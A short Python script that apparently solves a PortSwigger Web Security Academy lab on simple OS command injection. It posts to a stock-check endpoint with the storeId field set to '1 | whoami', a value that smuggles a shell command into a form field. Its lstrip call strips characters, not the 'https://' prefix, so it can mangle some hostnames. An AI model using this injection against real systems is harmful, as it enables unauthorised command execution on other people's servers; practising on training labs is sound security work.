"""
https://portswigger.net/web-security/os-command-injection/lab-simple
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

stock_post_url = f'https://{site}/product/stock'
post_data = {
    'productId' : '1',
    'storeId' : '1 | whoami'
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)